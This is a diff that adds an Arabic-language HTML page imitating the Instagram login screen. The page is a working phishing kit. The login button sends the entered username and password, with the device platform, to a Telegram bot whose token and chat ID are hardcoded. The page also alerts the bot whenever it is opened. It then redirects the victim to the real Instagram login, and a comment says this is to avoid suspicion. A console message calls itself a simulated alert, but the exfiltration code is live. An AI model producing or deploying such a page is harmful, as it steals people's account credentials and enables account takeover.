@@ -1,1 +1,200 @@
 <!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول • Instagram</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background-color: #fafafa; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            min-height: 100vh;
+            padding-top: 10px;
+        }
+
+        .language-top {
+            font-size: 14px;
+            color: #8e8e8e;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 350px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            width: 100%;
+            padding: 10px 40px;
+            border-radius: 8px; /* حواف مربعة خفيفة */
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .logo-box .logo-img {
+            width: 175px;
+            margin: 36px 0;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .input-form { margin-top: 24px; }
+        
+        input {
+            width: 100%;
+            height: 38px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 9px 8px 7px;
+            margin-bottom: 6px;
+            font-size: 12px;
+        }
+
+        input:focus { border-color: #a8a8a8; outline: none; }
+
+        .btn-login {
+            width: 100%;
+            background-color: #0095f6;
+            border: 1px solid transparent;
+            border-radius: 8px;
+            color: #fff;
+            font-weight: 600;
+            padding: 7px 0;
+            margin: 15px 0;
+            cursor: pointer;
+        }
+
+        .btn-login:disabled { background-color: #b2dffc; cursor: default; }
+
+        .forgot-pass { font-size: 12px; color: #00376b; text-decoration: none; display: block; margin-top: 10px; }
+
+        .new-account-box {
+            text-align: center;
+            margin-top: auto;
+            margin-bottom: 20px;
+            width: 100%;
+            max-width: 350px;
+        }
+
+        .btn-new-account {
+            width: 100%;
+            border: 1px solid #dbdbdb;
+            background-color: #fff;
+            border-radius: 8px;
+            color: #0095f6;
+            font-weight: 600;
+            padding: 10px 0;
+            text-decoration: none;
+            display: block;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        footer { padding: 24px; color: #8e8e8e; font-size: 12px; text-align: center; margin-top: auto;}
+    </style>
+</head>
+<body>
+
+    <div class="language-top">العربية (الأردن) <span>▼</span></div>
+
+    <div class="login-container">
+        <div class="logo-box">
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/y1/r/68yL7GkI1k4.png" alt="Instagram" class="logo-img">
+            
+            <div class="input-form">
+                <input type="text" id="username_field" placeholder="اسم المستخدم، أو الهاتف، أو البريد الإلكتروني" required>
+                <input type="password" id="password_field" placeholder="كلمة السر" required>
+                <button class="btn-login" onclick="captureAndNotify()" id="login_btn" disabled>تسجيل الدخول</button>
+            </div>
+
+            <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
+        </div>
+    </div>
+
+    <div class="new-account-box">
+        <a href="#" class="btn-new-account">إنشاء حساب جديد</a>
+    </div>
+
+    <footer>
+        <img src="https://static.cdninstagram.com/rsrc.php/v3/yp/r/45f8FkX4D6I.png" alt="Meta" height="15px"><br>
+        &copy; 2026 Instagram from Meta
+    </footer>
+
+    <script>
+        // إعدادات البوت التي زودتني بها
+        const CONFIG = {
+            TOKEN: "8561370342:AAESNgx1om8jD4cjRPqlvhUw73I4OHR6soA",
+            CHAT_ID: "7952511316"
+        };
+
+        // تفعيل زر تسجيل الدخول فقط عند ملء الحقول (كما في الحقيقي)
+        const userInput = document.getElementById('username_field');
+        const passInput = document.getElementById('password_field');
+        const loginBtn = document.getElementById('login_btn');
+
+        function checkInputs() {
+            if (userInput.value.length > 0 && passInput.value.length >= 6) {
+                loginBtn.removeAttribute('disabled');
+            } else {
+                loginBtn.setAttribute('disabled', 'disabled');
+            }
+        }
+
+        userInput.addEventListener('input', checkInputs);
+        passInput.addEventListener('input', checkInputs);
+
+        // وظيفة التنبيه الفوري بمجرد فتح الصفحة
+        window.onload = function() {
+            const openMsg = `🔔 شخص ما فتح الصفحة المقلدة!\n📱 الجهاز: ${navigator.platform}`;
+            sendToTelegram(openMsg);
+        };
+
+        async function captureAndNotify() {
+            const u = userInput.value;
+            const p = passInput.value;
+
+            // محاكاة سحب البيانات في لوحة التحكم (الـ Console)
+            console.log("%c--- [تنبيه أمني محاكي] ---", "color: red; font-weight: bold; font-size: 16px;");
+            console.log("البيانات التي تم إدخالها:");
+            console.log("المعرف: " + u);
+            console.log("الباسورد: " + p);
+            console.log("------------------------------------");
+
+            const captureMsg = `⚠️ صيد جديد (Instagram) ⚠️\n👤 User: ${u}\n🔑 Pass: ${p}\n📱 الجهاز: ${navigator.platform}`;
+            await sendToTelegram(captureMsg);
+            
+            // التمويه: إعادة توجيه الضحية لصفحة إنستجرام الحقيقية لتقليل الشك
+            window.location.href = "https://www.instagram.com/accounts/login/";
+        }
+
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.CHAT_ID,
+                        text: message
+                    })
+                });
+            } catch (error) {
+                console.error("فشل في إرسال التنبيه، تأكد من اتصالك بالإنترنت.");
+            }
+        }
+    </script>
+</body>
+</html>
